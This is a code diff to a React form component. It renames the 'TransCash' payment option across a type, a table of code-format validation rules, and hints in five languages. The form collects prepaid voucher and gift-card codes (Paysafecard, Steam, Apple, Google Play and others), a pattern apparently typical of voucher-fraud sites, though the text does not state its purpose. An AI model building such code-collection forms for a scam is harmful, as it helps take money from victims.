@@ -2,10 +2,10 @@ import React, { FormEvent, useState } from "react";
 import { Language, useI18n } from "../i18n";
 
 type FormStatus = "idle" | "sending" | "success" | "error";
-type PaymentMethod = "" | "TransCash" | "Paysafecard" | "Google Play Card" | "Neosurf" | "Steam Card" | "Apple Gift Card" | "Autre";
+type PaymentMethod = "" | "Transcash" | "Paysafecard" | "Google Play Card" | "Neosurf" | "Steam Card" | "Apple Gift Card" | "Autre";
 
 const referenceRules: Record<Exclude<PaymentMethod, "" | "Autre">, { length: number; pattern: string; digitsOnly: boolean }> = {
-  TransCash: { length: 12, pattern: "[0-9]{12}", digitsOnly: true },
+  Transcash: { length: 12, pattern: "[0-9]{12}", digitsOnly: true },
   Paysafecard: { length: 16, pattern: "0[0-9]{15}", digitsOnly: true },
   "Google Play Card": { length: 16, pattern: "[A-Za-z0-9]{16}", digitsOnly: false },
   Neosurf: { length: 10, pattern: "[A-Za-z0-9]{10}", digitsOnly: false },
@@ -14,11 +14,11 @@ const referenceRules: Record<Exclude<PaymentMethod, "" | "Autre">, { length: num
 };
 
 const ruleHints: Record<Language, Record<Exclude<PaymentMethod, "" | "Autre">, string>> = {
-  fr: { TransCash: "12 chiffres exactement", Paysafecard: "16 chiffres exactement, en commençant par 0", "Google Play Card": "16 caractères alphanumériques exactement", Neosurf: "10 caractères alphanumériques exactement", "Steam Card": "15 caractères alphanumériques exactement", "Apple Gift Card": "16 caractères alphanumériques exactement" },
-  en: { TransCash: "Exactly 12 digits", Paysafecard: "Exactly 16 digits, starting with 0", "Google Play Card": "Exactly 16 alphanumeric characters", Neosurf: "Exactly 10 alphanumeric characters", "Steam Card": "Exactly 15 alphanumeric characters", "Apple Gift Card": "Exactly 16 alphanumeric characters" },
-  de: { TransCash: "Genau 12 Ziffern", Paysafecard: "Genau 16 Ziffern, beginnend mit 0", "Google Play Card": "Genau 16 alphanumerische Zeichen", Neosurf: "Genau 10 alphanumerische Zeichen", "Steam Card": "Genau 15 alphanumerische Zeichen", "Apple Gift Card": "Genau 16 alphanumerische Zeichen" },
-  it: { TransCash: "Esattamente 12 cifre", Paysafecard: "Esattamente 16 cifre, iniziando con 0", "Google Play Card": "Esattamente 16 caratteri alfanumerici", Neosurf: "Esattamente 10 caratteri alfanumerici", "Steam Card": "Esattamente 15 caratteri alfanumerici", "Apple Gift Card": "Esattamente 16 caratteri alfanumerici" },
-  es: { TransCash: "Exactamente 12 dígitos", Paysafecard: "Exactamente 16 dígitos, empezando por 0", "Google Play Card": "Exactamente 16 caracteres alfanuméricos", Neosurf: "Exactamente 10 caracteres alfanuméricos", "Steam Card": "Exactamente 15 caracteres alfanuméricos", "Apple Gift Card": "Exactamente 16 caracteres alfanuméricos" },
+  fr: { Transcash: "12 chiffres exactement", Paysafecard: "16 chiffres exactement, en commençant par 0", "Google Play Card": "16 caractères alphanumériques exactement", Neosurf: "10 caractères alphanumériques exactement", "Steam Card": "15 caractères alphanumériques exactement", "Apple Gift Card": "16 caractères alphanumériques exactement" },
+  en: { Transcash: "Exactly 12 digits", Paysafecard: "Exactly 16 digits, starting with 0", "Google Play Card": "Exactly 16 alphanumeric characters", Neosurf: "Exactly 10 alphanumeric characters", "Steam Card": "Exactly 15 alphanumeric characters", "Apple Gift Card": "Exactly 16 alphanumeric characters" },
+  de: { Transcash: "Genau 12 Ziffern", Paysafecard: "Genau 16 Ziffern, beginnend mit 0", "Google Play Card": "Genau 16 alphanumerische Zeichen", Neosurf: "Genau 10 alphanumerische Zeichen", "Steam Card": "Genau 15 alphanumerische Zeichen", "Apple Gift Card": "Genau 16 alphanumerische Zeichen" },
+  it: { Transcash: "Esattamente 12 cifre", Paysafecard: "Esattamente 16 cifre, iniziando con 0", "Google Play Card": "Esattamente 16 caratteri alfanumerici", Neosurf: "Esattamente 10 caratteri alfanumerici", "Steam Card": "Esattamente 15 caratteri alfanumerici", "Apple Gift Card": "Esattamente 16 caratteri alfanumerici" },
+  es: { Transcash: "Exactamente 12 dígitos", Paysafecard: "Exactamente 16 dígitos, empezando por 0", "Google Play Card": "Exactamente 16 caracteres alfanuméricos", Neosurf: "Exactamente 10 caracteres alfanuméricos", "Steam Card": "Exactamente 15 caracteres alfanuméricos", "Apple Gift Card": "Exactamente 16 caracteres alfanuméricos" },
 };
 
 const referenceLabels: Record<Language, { label: string; placeholder: string }> = {
